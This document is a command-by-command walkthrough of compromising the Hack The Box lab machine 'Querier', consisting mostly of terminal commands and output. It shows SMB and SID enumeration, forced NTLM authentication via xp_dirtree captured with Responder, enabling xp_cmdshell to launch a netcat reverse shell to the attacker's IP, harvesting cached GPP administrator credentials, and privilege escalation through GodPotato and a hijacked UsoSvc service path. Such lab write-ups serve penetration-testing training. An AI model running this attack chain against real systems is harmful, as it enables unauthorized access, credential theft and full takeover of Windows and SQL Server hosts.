
```
kali@kali ~> nmap -sC -sV 10.10.10.125
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-24 11:12 EDT
Nmap scan report for 10.10.10.125
Host is up (0.068s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info:
|   10.10.10.125:1433:
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL
|     DNS_Tree_Name: HTB.LOCAL
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-07-24T15:13:00+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-24T15:11:34
|_Not valid after:  2054-07-24T15:11:34
| ms-sql-info:
|   10.10.10.125:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-07-24T15:12:54
|_  start_date: N/A
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.47 seconds

```

```

```


```
kali@kali ~ [2]> lookupsid.py anonymous@10.10.10.125
Impacket v0.11.0 - Copyright 2023 Fortra

Password:
[*] Brute forcing SIDs at 10.10.10.125
[*] StringBinding ncacn_np:10.10.10.125[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-3654930405-3667393904-3517260747
500: QUERIER\Administrator (SidTypeUser)
501: QUERIER\Guest (SidTypeUser)
503: QUERIER\DefaultAccount (SidTypeUser)
504: QUERIER\WDAGUtilityAccount (SidTypeUser)
513: QUERIER\None (SidTypeGroup)
1001: QUERIER\mssql-svc (SidTypeUser)
1002: QUERIER\reporting (SidTypeUser)
1003: QUERIER\SQLServer2005SQLBrowserUser$QUERIER (SidTypeAlias)

```


```
kali@kali ~> smbclient -L \\\\10.10.10.125\\ -U "anonymous"
Password for [WORKGROUP\anonymous]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	Reports         Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```


```
PcwTWTHRwryjc$c6
```



```
kali@kali ~> mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> xp_dirtree \\10.10.14.66\a
subdirectory   depth   file
------------   -----   ----
SQL (QUERIER\reporting  reporting@volume)>

```


```
kali@kali ~> sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.66]
    Responder IPv6             [dead:beef:2::1040]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-YNK0YC4M3T4]
    Responder Domain Name      [TB7R.LOCAL]
    Responder DCE-RPC Port     [46919]

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:daa273b6cbbe2c27:498F80112EBD6C3C5C954664193D60D6:010100000000000080364E93D5DDDA016E9211A4C3450A690000000002000800540042003700520001001E00570049004E002D0059004E004B0030005900430034004D0033005400340004003400570049004E002D0059004E004B0030005900430034004D003300540034002E0054004200370052002E004C004F00430041004C000300140054004200370052002E004C004F00430041004C000500140054004200370052002E004C004F00430041004C000700080080364E93D5DDDA0106000400020000000800300030000000000000000000000000300000E929347C358686692400807842D440A285C20D2AED30B00215C775A497B9D2360A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0036003600000000000000000000000000

```




https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

https://pentesting.academy/p/how-to-get-a-xp-cmdshell-reverse-shell-in-a-windows-server-a9696041a785

https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#download-and-execute-in-background-with-amsi-bypass


```
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

```
xp_cmdshell c:\temp\nc.exe -e cmd.exe 10.10.14.66 9191
```

```
PS C:\tempo> . .\PowerUp.ps1
. .\PowerUp.ps1
PS C:\tempo> Invoke-AllChecks
Invoke-AllChecks


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2016
ProcessId   : 4464
Name        : 4464
Check       : Process Token Privileges


ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files


```



```
kali@kali ~> nxc smb 10.10.10.125 -u 'administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' --local-auth
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] QUERIER\administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
SMB         10.10.10.125    445    QUERIER          [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
kali@kali ~> nxc smb 10.10.10.125 -u 'administrator' -p 'MyUnclesAreMarioAndLuigi!!1!' --local-auth -x "type C:\Users\Administrator\desktop\root.txt"
SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] QUERIER\administrator:MyUnclesAreMarioAndLuigi!!1! (Pwn3d!)
SMB         10.10.10.125    445    QUERIER          [-] Neo4J does not seem to be available on bolt://127.0.0.1:7687.
SMB         10.10.10.125    445    QUERIER          [+] Executed command via wmiexec
SMB         10.10.10.125    445    QUERIER          184e02d8a1e37e0c0d5698ea69673813

```





----


# Beyond root, trying god potato again


```
C:\tempo> .\GodPotato-NET4.exe

    FFFFF                   FFF  FFFFFFF
   FFFFFFF                  FFF  FFFFFFFF
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF


Arguments:

	-cmd Required:True CommandLine (default cmd /c whoami)

Example:

GodPotato -cmd "cmd /c whoami"
GodPotato -cmd "cmd /c whoami"


C:\tempo> GodPotato-NET4.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140713103589376
[*] DispatchTable: 0x140713105902800
[*] UseProtseqFunction: 0x140713105281120
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] CreateNamedPipe \\.\pipe\80c86a00-1769-4894-a65a-b34f5992c6eb\pipe\epmapper
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00001802-0e6c-ffff-deb2-da2b691c2d8f
[*] DCOM obj OXID: 0xf1a802b594b0a91c
[*] DCOM obj OID: 0x67ebd20cb6ea4488
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 844 Token:0x652  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 3580
nt authority\system


```


# Service permissions

first we inspect the service

```
C:\tempo>sc qc UsoSvc
sc qc UsoSvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: UsoSvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START  (DELAYED)
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs -p
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Update Orchestrator Service
        DEPENDENCIES       : rpcss
        SERVICE_START_NAME : LocalSystem

```

then we stop it

```
C:\tempo>sc stop UsoSvc
sc stop UsoSvc

SERVICE_NAME: UsoSvc
        TYPE               : 30  WIN32
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x3
        WAIT_HINT          : 0x7530

```

so now we add and change the bin path

```
C:\tempo>sc config UsoSvc binpath= "net localgroup administrators mssql-svc /add
sc config UsoSvc binpath= "net localgroup administrators mssql-svc /add
[SC] ChangeServiceConfig SUCCESS
```

and now we starta nd check he results

```
C:\tempo>sc start UsoSvc
sc start UsoSvc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
C:\tempo>net localgroup administrators
net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members
-------------------------------------------------------------------------------
Administrator
mssql-svc
The command completed successfully.

```